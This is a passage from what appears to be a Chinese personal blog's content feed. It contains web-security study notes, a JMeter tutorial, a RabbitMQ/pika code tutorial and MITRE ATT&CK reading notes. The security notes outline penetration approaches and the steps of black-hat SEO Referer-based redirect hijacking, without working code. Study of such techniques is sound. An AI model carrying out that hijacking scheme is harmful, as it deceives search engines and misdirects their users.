href="https://blog.csdn.net/u014695894/article/details/87885380" target="_blank" rel="noopener">https://blog.csdn.net/u014695894/article/details/87885380</a><br>)</p><h2 id="服务器渗透"><a href="#服务器渗透" class="headerlink" title="服务器渗透"></a>服务器渗透</h2><h3 id="手段"><a href="#手段" class="headerlink" title="手段"></a>手段</h3><ul><li>C段渗透：通过渗透同一网段内的一台主机对目标主机进行ARP等手段的渗透</li><li>社会工程学</li><li>Services:直接对服务进行溢出</li></ul><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h3><p>curl请求,cmd使用curl发送请求</p><pre class=" language-bash"><code class="language-bash">curl www.baidu.com   //返回服务器响应的html数据curl www.baidu.com -I //返回服务器的Http响应</code></pre><h3 id="SEO之搜索引擎劫持"><a href="#SEO之搜索引擎劫持" class="headerlink" title="SEO之搜索引擎劫持"></a>SEO之搜索引擎劫持</h3><p>SEO(Security Engine Optimization)，搜索引擎优化。也就是让网站的的排名更靠前，排名第一的网站可能做了SEO优化。黑帽SEO就是指通过作弊的手段欺骗搜索引擎，获取非正常排名，让网站更靠前。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>黑帽SEO利用HTTP请求中的Referer以及User-Agent请求头来欺骗搜索引擎，Rferer用于告诉Web服务器，用户是从哪个页面找过来的，User-Agent则是告诉用户Web服务器使用的浏览器和操作系统信息。黑帽SEO的一般步骤如下：</p><ol><li>建立劫持搜索引擎库，如baidu/google等域名为关键字</li><li>获取HTTP Referer请求头</li><li>遍历搜索引擎库，并与Referer的内容相比较，如果两者相同或存在搜索引擎关键字，那么页面就会发送跳转，也就是域名劫持。</li></ol><h2 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h2><h3 id="Web容器"><a href="#Web容器" class="headerlink" title="Web容器"></a>Web容器</h3><p>web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，一个服务器可以有多个容器。常见的Web容器有IIS、Nginx、Apache、Tomcat、</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> SEO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>接口性能测试</title>
      <link href="/2020/06/10/testing/"/>
      <url>/2020/06/10/testing/</url>
      
        <content type="html"><![CDATA[<h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>本系列性能测试全都基于WebTours环境来进行</p><h2 id="Jmeter"><a href="#Jmeter" class="headerlink" title="Jmeter"></a>Jmeter</h2><h3 id="元件"><a href="#元件" class="headerlink" title="元件"></a>元件</h3><ul><li>sampler（取样器），包含http请求、ftp请求等</li><li>Logic Controller（逻辑控制器），内包含各种控制器，如if、foeach等控制器。其本身只对其子节点的sampler有效。</li><li>Config Elements（配置元件）：包含session、cookie等管理器，影响其范围内的所有元件。</li><li>Pre-porcessors（前置处理器）：在sampler之前执行，如sampler需要大量参数配置时（如post请求需要携带大量参数），作用域其范围内的sampler</li><li>Post-porcessors（后置处理器）：在sampler之后执行，如下一个请求需要钱一个请求请求结果时。作用域其范围内的sampler。</li><li>Timer（定时器）：对其作用范围内的每一个sampler有效</li><li>Assirtions（断言）：对其作用范围内的每一个sampler元件的响应头Response Headers、响应体Response body、或者请求头等做出校验。</li><li>Listener（监听器）：收集其作用范围内的每一个sampler元件的执行情况，返回并统计。可表格形式展现，也可图表形式，不过图表形式可能需要安装扩展插件。</li><li>Test Fragment（测试片段），它的主要作用是模块化测试过程，类似于编程语言中的函数。即，将测试过程封装成测试片段，就可以在其他地方直接引用了。作用范围内的每一个sampler。</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装Jmeter需要JDK环境，并将java配置环境变量，然后打开Jmeter/bin/jmeter.bat运行即可</p><h3 id="Jmeter用处"><a href="#Jmeter用处" class="headerlink" title="Jmeter用处"></a>Jmeter用处</h3><ul><li>接口测试</li><li>接口性能测试</li><li>负载测试</li><li>压力/稳定性测试</li></ul><h3 id="Jmeter功能"><a href="#Jmeter功能" class="headerlink" title="Jmeter功能"></a>Jmeter功能</h3><ul><li>多线程框架-支持多并发操作</li><li>用于对服务器模拟负载</li><li>支持Web/数据库/FTP服务器系统的性能测试</li><li>开源/纯JAVA/可二次定制化开发</li></ul><h2 id="Jmeter使用"><a href="#Jmeter使用" class="headerlink" title="Jmeter使用"></a>Jmeter使用</h2><h3 id="线程组"><a href="#线程组" class="headerlink" title="线程组"></a>线程组</h3><p><img src="https://pic.downk.cc/item/5ee0e987c2a9a83be5f66500.png" alt=""><br>上图如果要使用持续时间，要勾选永远，</p><blockquote><p>注：整个线程组进行的配置只针对一个线程(用户)，如果有5个线程则所有操作执行5次</p></blockquote><h2 id="Jmeter脚本"><a href="#Jmeter脚本" class="headerlink" title="Jmeter脚本"></a>Jmeter脚本</h2><p>Jmeter脚本指的是模拟用户操作的请求</p><h3 id="代理服务器录制脚本"><a href="#代理服务器录制脚本" class="headerlink" title="代理服务器录制脚本"></a>代理服务器录制脚本</h3><ol><li>设置浏览器代理</li><li>启动代理服务器(Jmeter)</li></ol><ul><li>右键点击testplan-&gt;添加-&gt;http代理服务器</li><li>新建一个线程组，用来放置脚本<br><img src="https://pic.downk.cc/item/5ee0ff8ac2a9a83be5161e97.png" alt=""></li></ul><ol start="3"><li>操作浏览器</li><li>自动录制脚本<br><img src="https://pic.downk.cc/item/5ee0ffb9c2a9a83be516757a.png" alt=""></li></ol><h2 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h2><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li>内部接口：方法与方法之间的交互，模块与模块之间的交互</li><li>调用对外包装的接口</li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul><li>Web接口(https/http/webservice)</li><li>应用程序接口</li><li>数据库接口</li></ul><h3 id="接口测试原理"><a href="#接口测试原理" class="headerlink" title="接口测试原理"></a>接口测试原理</h3><p>接口测试属于功能测试，也可以看作是需要了解部分代码的灰盒测试，测试流程是：</p><ol><li>测试接口文档</li><li>根据接口文档编写测试用例</li><li>执行测试<br>查看接口返回的接口数据是否正确</li></ol><h3 id="接口测试的必要性"><a href="#接口测试的必要性" class="headerlink" title="接口测试的必要性"></a>接口测试的必要性</h3><ul><li>案例：一个登陆接口</li><li>场景：产品上规定用户名6-10个字符数字下划线，测试人员测试在前端做了校验通过，后端人员没有做校验</li><li>风险：攻击者直接抓包篡改接口，绕过校验，可以通过sql注入直接随意登录</li></ul><h3 id="接口测试操作"><a href="#接口测试操作" class="headerlink" title="接口测试操作"></a>接口测试操作</h3><p><img src="https://pic.downk.cc/item/5ee46f10c2a9a83be5c683a6.png" alt=""><br><img src="https://pic.downk.cc/item/5ee46f35c2a9a83be5c6c41b.png" alt=""></p><h2 id="测试报告导出"><a href="#测试报告导出" class="headerlink" title="测试报告导出"></a>测试报告导出</h2><pre class=" language-bash"><code class="language-bash">jmeter -n -t 测试计划jmx文件的路径 -l report.jtl<span class="token punctuation">(</span>自定义<span class="token punctuation">)</span> -e -o 报告存储路径<span class="token punctuation">(</span>必须为非空文件夹<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jmeter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ</title>
      <link href="/2020/06/09/rabbitmq/"/>
      <url>/2020/06/09/rabbitmq/</url>
      
        <content type="html"><![CDATA[<h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>在参阅本篇博文之前建议先对队列进行学习。</p><h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><p>MQ全称为Message Queue消息队列(MQ),是一种应用程序对应用程序的通信方法，MQ是消费-生产者模型的一个典型代表，一端往消息队列中不断写入消息，而另一端可以读取队列中的消息，这样发布者和使用者都不知道对方的存在。</p><p>生产者消费者模式是通过一个容器来解决生产者消费者的强耦合问题，生产者和消费者彼此之间不直接通讯，而通过阻塞队列来进行通讯，所以生产者生产完数据之后不用等待消费者处理，直接扔给阻塞队列，消费者不用找生产者要数据，而是直接从阻塞队列中取。阻塞队列就相当于一个缓冲区，平衡了生产者和消费者的处理能力。</p><h3 id="同步处理"><a href="#同步处理" class="headerlink" title="同步处理"></a>同步处理</h3><p><img src="https://pic.downk.cc/item/5edf53c8c2a9a83be5d7759b.png" alt=""></p><h3 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h3><p><img src="https://pic.downk.cc/item/5edf540cc2a9a83be5d7d845.png" alt=""></p><h3 id="为什么要用消息队列"><a href="#为什么要用消息队列" class="headerlink" title="为什么要用消息队列"></a>为什么要用消息队列</h3><p>消息队列中间件是分布式系统中的重要组件，主要解决应用解耦，异步消息，流量削峰等问题。</p><h3 id="消息队列的优点"><a href="#消息队列的优点" class="headerlink" title="消息队列的优点"></a>消息队列的优点</h3><h4 id="解耦"><a href="#解耦" class="headerlink" title="解耦"></a>解耦</h4><p>允许独立的扩展或修改两边的处理过程，只要确保它们遵守同样的接口约束</p><h4 id="可恢复性"><a href="#可恢复性" class="headerlink" title="可恢复性"></a>可恢复性</h4><p>系统的一部分组件失效时，不会影响到整个系统，消息队列降低了进程间的耦合度，所以即使一个处理消息的进程挂掉，加入队列中的消息仍然可以在系统恢复后被处理</p><h4 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h4><p>有助于控制和优化数据流经过系统的速度，解决生产消息和消费消息的处理速度不一致的情况。</p><h4 id="灵活性-峰值处理能力-削峰"><a href="#灵活性-峰值处理能力-削峰" class="headerlink" title="灵活性/峰值处理能力(削峰)"></a>灵活性/峰值处理能力(削峰)</h4><p>在访问量剧增的情况下，应用仍需发挥作用，但是这样的突发流量并不常见，如果以处理这类峰值访问为标准来投入资源随时待命无疑会是巨大的浪费。使用消息队列能够使关键组件顶住突发的访问压力，而不会因为突发的超负荷请求而完全崩溃</p><h4 id="异步通信"><a href="#异步通信" class="headerlink" title="异步通信"></a>异步通信</h4><p>很多时候，用户不想也不需要立即处理消息，消息队列提供了异步处理机制，允许用户把第一个消息放入队列，但不立即处理它，想向队列中放入多少消息就放多少，然后在需要的时候去处理它。</p><h3 id="消息队列的两种模式"><a href="#消息队列的两种模式" class="headerlink" title="消息队列的两种模式"></a>消息队列的两种模式</h3><h4 id="点对点模式-一对一"><a href="#点对点模式-一对一" class="headerlink" title="点对点模式(一对一)"></a>点对点模式(一对一)</h4><p>一对一，消费者主动拉取数据，收到消息后会将队列中的消息清除。<br>消费生产者生产消息发送到队列以后，消费者从队列中取出消息并消费它，消息消费以后，队列中不再有存储，所以消费者不可能消费到已经被消费的消息。队列支持存在多个消费者，但对一个消息而言，只会有一个消费者可以消费</p><h4 id="发布-订阅模式-一对多"><a href="#发布-订阅模式-一对多" class="headerlink" title="发布/订阅模式(一对多)"></a>发布/订阅模式(一对多)</h4><p>一对多，消费者消费数据后不会清除消息，消息生产者将消息发布到topic中，同时有多个消息消费者消费该消息。生产者发布到topic的消息会被所有订阅者消费。<br>消费可以分为消费者主动从队列获取消息，也可以为队列主动推送给消费者消息进行消费(比如公众号)</p><h2 id="RabbitMQ模式"><a href="#RabbitMQ模式" class="headerlink" title="RabbitMQ模式"></a>RabbitMQ模式</h2><p>RabbitMQ分为简单模式和交换机模式</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>建议安装在linux系统下，windows系统配置容易出错</p><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>在anaconda环境下输入以下命令：</p><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> pika</code></pre><h3 id="简单模式"><a href="#简单模式" class="headerlink" title="简单模式"></a>简单模式</h3><p>生产者要向RabbitMQ队列中插入数据，消费者监听队列，当RabbitMQ中有消息时取出消费。</p><h4 id="生产者"><a href="#生产者" class="headerlink" title="生产者"></a>生产者</h4><ol><li>连接RabbitMQ</li><li>在RabbitMQ中创建一个队列对象</li><li>向指定的队列中插入数据<pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> pika<span class="token comment" spellcheck="true">#1、连接RabbitMQ</span>connection <span class="token operator">=</span> pika.BlockingConnection<span class="token punctuation">(</span>pika.ConnectionParameters<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">))</span>     <span class="token comment" spellcheck="true">#连接RabbitMQ</span>channel <span class="token operator">=</span> connection.channel<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#获取RabbitMQ对象,通过channel对RabbitMQ进行操作</span><span class="token comment" spellcheck="true"># 2、在RabbitMQ中创建一个队列对象</span>channel.queue_declare<span class="token punctuation">(</span>queue<span class="token operator">=</span><span class="token string">'hello'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#3、向指定队列插入数据</span>channel.basic_publish<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">''</span>, <span class="token comment" spellcheck="true">#简单模式</span>                  routing_key <span class="token operator">=</span> <span class="token string">'hello'</span>, <span class="token comment" spellcheck="true">#指定队列</span>                  body <span class="token operator">=</span> <span class="token string">'hello world'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#指定数据</span></code></pre></li></ol><h4 id="消费者"><a href="#消费者" class="headerlink" title="消费者"></a>消费者</h4><ol><li>连接RabbitMQ</li><li>监听模式</li><li>确定回调函数</li></ol><h5 id="默认应答"><a href="#默认应答" class="headerlink" title="默认应答"></a>默认应答</h5><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> pikaconnection <span class="token operator">=</span> pika.BlockingConnection<span class="token punctuation">(</span>pika.ConnectionParameters<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">))</span>connection <span class="token operator">=</span> connection.channel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#创建队列</span>channel.queue_declare<span class="token punctuation">(</span>queue<span class="token operator">=</span><span class="token string">'hello'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#如果已存在hello队列则没有作用，如果不存在hello队列则新建一个队列</span>def callback<span class="token punctuation">(</span>ch,method,properties,body<span class="token punctuation">)</span>: <span class="token comment" spellcheck="true">#body是从队列中取出的数据</span>    pass<span class="token comment" spellcheck="true">#确定监听队列</span>channel.basic_consume<span class="token punctuation">(</span>queue<span class="token operator">=</span><span class="token string">'hello'</span>,                      auto_ack<span class="token operator">=</span>True,  <span class="token comment" spellcheck="true">#默认应答，数据从队列中取走之后，不论消费者是否处理成功，该数据就不存在队列中。如果为手动应答，该项置为False，数据被取走后会在队列中进行拷贝，等消费者返回处理成功信号才删除数据</span>                       on_message_callback<span class="token operator">=</span>callback<span class="token punctuation">)</span>channel.start_consuming<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#开始监听，队列有数据时调用回调函数，没有数据时进行监听</span></code></pre><h5 id="手动应答"><a href="#手动应答" class="headerlink" title="手动应答"></a>手动应答</h5><pre class=" language-bash"><code class="language-bash">def callback<span class="token punctuation">(</span>ch,method,properties,body<span class="token punctuation">)</span>:    ch.basic_ack<span class="token punctuation">(</span>delivery_tag <span class="token operator">=</span>method.delivery_tag<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#应答信息</span>channel.basic_consume<span class="token punctuation">(</span>queue<span class="token operator">=</span><span class="token string">'hello'</span>,                      auto_ack<span class="token operator">=</span>False,                       on_message_callback<span class="token operator">=</span>callback<span class="token punctuation">)</span></code></pre><h3 id="持久化参数"><a href="#持久化参数" class="headerlink" title="持久化参数"></a>持久化参数</h3><p>用于处理RabbitMQ服务器崩溃造成的数据丢失问题。创建队列的语句参数durable:(消费者/生产者端均需要设置)</p><pre class=" language-bash"><code class="language-bash">channel.queue_declare<span class="token punctuation">(</span>queue<span class="token operator">=</span><span class="token string">'hello'</span>,durable<span class="token operator">=</span>True<span class="token punctuation">)</span></code></pre><p>对于插入的数据是否持久化，要自己设置(生产者端)：</p><pre class=" language-bash"><code class="language-bash">channel.basic_publish<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">''</span>, <span class="token comment" spellcheck="true">#简单模式</span>                     routing_key <span class="token operator">=</span> <span class="token string">'hello'</span>, <span class="token comment" spellcheck="true">#指定队列</span>                     body <span class="token operator">=</span> <span class="token string">'hello world'</span>                     properties<span class="token operator">=</span>pika.BasicProperties<span class="token punctuation">(</span>delivery_mode<span class="token operator">=</span>2  <span class="token comment" spellcheck="true">#数据持久化保存</span>                     <span class="token punctuation">)</span>,<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#指定数据</span></code></pre><h3 id="分发参数"><a href="#分发参数" class="headerlink" title="分发参数"></a>分发参数</h3><p>分发默认的机制是轮询机制(一个消费者一条消息的分发,每个消费者都要收到队列中的所有)</p><h3 id="交换机模式"><a href="#交换机模式" class="headerlink" title="交换机模式"></a>交换机模式</h3><h4 id="发布订阅"><a href="#发布订阅" class="headerlink" title="发布订阅"></a>发布订阅</h4><p><img src="https://pic.downk.cc/item/5ef9c75e14195aa5942b810a.png" alt=""></p><h5 id="消费者-1"><a href="#消费者-1" class="headerlink" title="消费者"></a>消费者</h5><p>要先运行消费者创建消息队列</p><ol><li>连接rabbitMQ</li><li>声明交换机(有就，没有)</li><li>创建消息队列</li><li>绑定交换机</li><li>回调函数(后续步骤与简单模式相同)</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> pika<span class="token comment" spellcheck="true">#1. 连接rabbitMQ</span>connection <span class="token operator">=</span> pika.BlockingConnection<span class="token punctuation">(</span>pika.ConnectionParameters<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">))</span>connection <span class="token operator">=</span> connection.channel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2.声明一个名为logs类型为fanout的交换机(要与生产者一致)</span>channel.exchange_declare<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">'logs'</span>,                          exchange_type<span class="token operator">=</span><span class="token string">'fanout'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fanout是发布订阅模式参数</span><span class="token comment" spellcheck="true">#3. 创建队列</span>result <span class="token operator">=</span> channel.queue_declare<span class="token punctuation">(</span><span class="token string">""</span>,exclusive<span class="token operator">=</span>True<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#让rabbitNQ随机分配队列名</span>queue_name <span class="token operator">=</span> result.method.queue <span class="token comment" spellcheck="true">#获取队列名</span><span class="token comment" spellcheck="true">#4.将指定队列绑定到交换机上</span>channel.queue_bind<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">'logs'</span>,                    queue<span class="token operator">=</span>queue_name<span class="token punctuation">)</span>def callback<span class="token punctuation">(</span>ch,method,properties,body<span class="token punctuation">)</span>: <span class="token comment" spellcheck="true">#body是从队列中取出的数据</span>    pass<span class="token comment" spellcheck="true">#确定监听队列</span>channel.basic_consume<span class="token punctuation">(</span>queue<span class="token operator">=</span>queue_name,                      auto_ack<span class="token operator">=</span>True,  <span class="token comment" spellcheck="true">#默认应答，数据从队列中取走之后，不论消费者是否处理成功，该数据就不存在队列中。如果为手动应答，该项置为False，数据被取走后会在队列中进行拷贝，等消费者返回处理成功信号才删除数据</span>                       on_message_callback<span class="token operator">=</span>callback<span class="token punctuation">)</span>channel.start_consuming<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span></code></pre><p>因为订阅模式有多个消费者，所以运行时要启动多个consumer.py，在pycharm中需要在edit Configuration中设置allow parallel run</p><h5 id="生产者-1"><a href="#生产者-1" class="headerlink" title="生产者"></a>生产者</h5><ol><li>连接rabbitMQ</li><li>创建交换机</li><li>往交换机里生产数据</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> pika<span class="token comment" spellcheck="true">#1. 连接rabbitMQ</span>connection <span class="token operator">=</span> pika.BlockingConnection<span class="token punctuation">(</span>pika.ConnectionParameters<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">))</span>connection <span class="token operator">=</span> connection.channel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2.声明一个名为logs类型为fanout的交换机</span>channel.exchange_declare<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">'logs'</span>,                          exchange_type<span class="token operator">=</span><span class="token string">'fanout'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fanout是发布订阅模式参数</span><span class="token comment" spellcheck="true">#3. 向交换机中插入数据</span>data <span class="token operator">=</span> <span class="token string">"hello world"</span>channel.basic_publish<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">'logs'</span>,                      routing_key<span class="token operator">=</span><span class="token string">''</span>,                      body<span class="token operator">=</span>message<span class="token punctuation">)</span>connection.close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="关键字模式"><a href="#关键字模式" class="headerlink" title="关键字模式"></a>关键字模式</h4><p>在发布订阅模式的基础上进行增强，交换机的消息绑定特定的消息队列实现不同的消息传给不同的消费者。</p><h5 id="消费者-2"><a href="#消费者-2" class="headerlink" title="消费者"></a>消费者</h5><p>要先运行消费者生成消息队列</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> pika<span class="token comment" spellcheck="true">#1. 连接rabbitMQ</span>connection <span class="token operator">=</span> pika.BlockingConnection<span class="token punctuation">(</span>pika.ConnectionParameters<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">))</span>channel <span class="token operator">=</span> connection.channel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2.声明一个名为logs类型为fanout的交换机(要与生产者一致)</span>channel.exchange_declare<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">'logs'</span>,                          exchange_type<span class="token operator">=</span><span class="token string">'direct'</span>,                          durable<span class="token operator">=</span>True<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fanout是发布订阅模式参数</span><span class="token comment" spellcheck="true">#3. 创建队列</span>result <span class="token operator">=</span> channel.queue_declare<span class="token punctuation">(</span><span class="token string">""</span>,exclusive<span class="token operator">=</span>True<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#让rabbitNQ随机分配队列名,如果要使用持久化需要自己命名</span>queue_name <span class="token operator">=</span> result.method.queue <span class="token comment" spellcheck="true">#获取队列名</span><span class="token comment" spellcheck="true">#4.将指定队列绑定到交换机上</span>channel.queue_bind<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">'logs'</span>,                    queue<span class="token operator">=</span>queue_name,                    routing_key<span class="token operator">=</span><span class="token string">'keyword1'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#关键字，可以绑定多个</span>channel.queue_bind<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">'logs'</span>,                    queue<span class="token operator">=</span>queue_name,                    routing_key<span class="token operator">=</span><span class="token string">'keyword2'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#绑定第二个关键字</span>def callback<span class="token punctuation">(</span>ch,method,properties,body<span class="token punctuation">)</span>: <span class="token comment" spellcheck="true">#body是从队列中取出的数据</span>    ch.basic_ack<span class="token punctuation">(</span>delivery_tag<span class="token operator">=</span>method.delivery_tag<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#确定监听队列</span>channel.basic_consume<span class="token punctuation">(</span>queue<span class="token operator">=</span>queue_name,                      auto_ack<span class="token operator">=</span>True,  <span class="token comment" spellcheck="true">#默认应答，数据从队列中取走之后，不论消费者是否处理成功，该数据就不存在队列中。如果为手动应答，该项置为False，数据被取走后会在队列中进行拷贝，等消费者返回处理成功信号才删除数据</span>                       on_message_callback<span class="token operator">=</span>callback<span class="token punctuation">)</span>channel.start_consuming<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span></code></pre><h5 id="生产者-2"><a href="#生产者-2" class="headerlink" title="生产者"></a>生产者</h5><p>与订阅模式相比，需要修改exchange_type,</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> pika<span class="token comment" spellcheck="true">#1. 连接rabbitMQ</span>connection <span class="token operator">=</span> pika.BlockingConnection<span class="token punctuation">(</span>pika.ConnectionParameters<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">))</span>connection <span class="token operator">=</span> connection.channel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2.声明一个名为logs类型为fanout的交换机</span>channel.exchange_declare<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">'logs'</span>,                          exchange_type<span class="token operator">=</span><span class="token string">'direct'</span>,                          durable<span class="token operator">=</span>True<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fanout是发布订阅模式参数</span><span class="token comment" spellcheck="true">#3. 向交换机中插入数据</span>data <span class="token operator">=</span> <span class="token string">"hello world"</span>channel.basic_publish<span class="token punctuation">(</span>exchange<span class="token operator">=</span><span class="token string">'logs'</span>,                      routing_key<span class="token operator">=</span><span class="token string">'keyword1'</span>, <span class="token comment" spellcheck="true">#要与消费者一致</span>                      body<span class="token operator">=</span>message，                      properties<span class="token operator">=</span>pika.BasicProperties<span class="token punctuation">(</span>delivery_mode<span class="token operator">=</span>2<span class="token punctuation">)</span>,<span class="token punctuation">)</span>connection.close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="模糊匹配模式"><a href="#模糊匹配模式" class="headerlink" title="模糊匹配模式"></a>模糊匹配模式</h4>]]></content>
      
      
      <categories>
          
          <category> 框架使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> RabbitMQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK</title>
      <link href="/2020/06/05/att-1/"/>
      <url>/2020/06/05/att-1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-说在前面"><a href="#1-说在前面" class="headerlink" title="1 说在前面"></a>1 说在前面</h2><p>本文为《MITRE ATT&amp;CK设计与理念》的读书笔记</p><h2 id="2-MITRE-ATT-amp-CK"><a href="#2-MITRE-ATT-amp-CK" class="headerlink" title="2 MITRE ATT&amp;CK"></a>2 MITRE ATT&amp;CK</h2><p>MITRE ATT&amp;CK知识库描述网络入侵者行为，提供攻防两方的通用分类体系，已成为横跨多个网络安全学科的有效工具，涵盖威胁情报、红队测试或入侵者模拟、网络及系统入侵防御能力提升等领域。MITRE的ATT&amp;CK创建流程和新内容管理理念是此项工作的<br>关键部分，有助于创建其他类似的入侵者模型及信息资料库。</p><h3 id="2-1-ATT-amp-CK的含义"><a href="#2-1-ATT-amp-CK的含义" class="headerlink" title="2.1 ATT&amp;CK的含义"></a>2.1 ATT&amp;CK的含义</h3><p>MITRE精心策划的“入侵者战术、技术与共有的知识”框架 (ATT&amp;CK: AdversarialTactics, Techniques, and Common Knowledge)：</p><ul><li>反映入侵者攻击生命周期的各个阶段</li><li>揭示其意欲攻击的目标平台</li><li>是针对网络入侵者行为的知识库与模型。</li></ul><p>ATT&amp;CK脱胎于一个列举和分类Microsoft Windows™系统入侵后攻击战术、技术与流程 (TTP) 的项目。该项目的目的是提升恶意行为检测率。此项目后来还纳入了Linux™和MacOS™，并持续扩展至涵盖入侵前战术与技术，以及移动设备等技术焦点型领域。概括讲，ATT&amp;CK是由下列核<br>心组件构成的行为模型：<br>• 战术，指攻击过程中的短期战术性目标（各列）；<br>• 技术，表示入侵者达成战术目标所用的方法（各单元格）；<br>• 入侵者使用技术及其他元数据的记录（链接至技术）。</p><h3 id="2-2-历史背景"><a href="#2-2-历史背景" class="headerlink" title="2.2 历史背景"></a>2.2 历史背景</h3><p>ATT&amp;CK是应系统性分类入侵者行为的需求而诞生的。</p><h3 id="2-3-ATT-amp-CK用例"><a href="#2-3-ATT-amp-CK用例" class="headerlink" title="2.3 ATT&amp;CK用例"></a>2.3 ATT&amp;CK用例</h3><h4 id="2-3-1-入侵者模拟"><a href="#2-3-1-入侵者模拟" class="headerlink" title="2.3.1 入侵者模拟"></a>2.3.1 入侵者模拟</h4><p>基于针对相关入侵者和其攻击手法的网络威胁情报来做模拟攻击，从而评估技术领域安全性的过程。入侵者模拟专注组织在威胁生命周期所有适用点上验证检测和/或缓解入侵者攻击行为的能力。<br>ATT&amp;CK可用作创建入侵者模拟场景的工具，基于此测试验证安全防护系统应对常见入侵者技术的防御能力。</p><h4 id="2-3-2-红队"><a href="#2-3-2-红队" class="headerlink" title="2.3.2 红队"></a>2.3.2 红队</h4><p>在不使用已知威胁情报的情况下应用入侵者思维执行演练。红队专注秘密达成入侵者行动的最终目标，借此显示成功入侵的目标及其对运营的影响。<br>ATT&amp;CK可用作创建红队计划和和组织行动的工具，规避网络中特定的防御措施，也可以用作新的攻击方法的路线图，规避防御检测</p><h4 id="2-3-3-行为分析开发"><a href="#2-3-3-行为分析开发" class="headerlink" title="2.3.3 行为分析开发"></a>2.3.3 行为分析开发</h4><p>行为检测分析超越了传统失陷标志(IoC)或恶意行为特征码，可用于识<br>别系统或网络中不依赖于已知入侵者工具及指标的潜在恶意活动。这是一种分析入侵者与特定平台互动方式的方法，可以识别和关联独立于所用特定工具的可疑活动。</p><h4 id="2-3-4-防御缺口评估"><a href="#2-3-4-防御缺口评估" 